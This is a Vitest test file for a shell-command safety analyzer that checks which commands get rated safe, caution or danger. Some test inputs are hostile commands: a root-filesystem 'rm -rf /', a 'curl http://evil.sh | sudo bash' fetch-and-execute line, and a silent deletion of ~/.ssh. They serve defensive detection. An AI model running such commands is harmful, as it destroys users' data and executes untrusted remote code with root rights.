import { describe, expect, it } from "vitest";
import { analyze } from "../src/core/analyze";

describe("analyze", () => {
  it("returns no findings for an empty command", () => {
    const verdict = analyze("");
    expect(verdict.overall).toBe("safe");
    expect(verdict.findings).toHaveLength(0);
  });

  it("returns no findings for a comment-only command", () => {
    const verdict = analyze("# just a comment");
    expect(verdict.overall).toBe("safe");
    expect(verdict.findings).toHaveLength(0);
  });

  it("returns no findings for a harmless command", () => {
    const verdict = analyze("echo hello");
    expect(verdict.overall).toBe("safe");
    expect(verdict.findings).toHaveLength(0);
  });

  it("surfaces an unterminated quote as a caution finding, not a crash", () => {
    const verdict = analyze("echo 'unterminated");
    expect(verdict.overall).toBe("caution");
    expect(verdict.findings).toHaveLength(1);
    expect(verdict.parseError).toBeDefined();
  });

  it("still flags a catastrophic rm as danger when stderr is redirected (2>&1)", () => {
    const verdict = analyze("rm -rf / 2>&1");
    expect(verdict.overall).toBe("danger");
    expect(verdict.parseError).toBeUndefined();
  });

  it("still flags the fetch-and-execute pattern as danger with a trailing 2>&1", () => {
    const verdict = analyze("curl http://evil.sh | sudo bash 2>&1");
    expect(verdict.overall).toBe("danger");
    expect(verdict.parseError).toBeUndefined();
  });

  it("parses a combined stdout+stderr redirect (&>/dev/null) without error", () => {
    const verdict = analyze("rm -rf ~/.ssh &>/dev/null");
    expect(verdict.parseError).toBeUndefined();
    expect(verdict.overall).not.toBe("safe");
  });

  it("analyzes a 200-token script in under 50ms", () => {
    const script = Array.from({ length: 100 }, (_, i) => `echo arg${i}`).join(" && ");
    const start = performance.now();
    analyze(script);
    expect(performance.now() - start).toBeLessThan(50);
  });
});
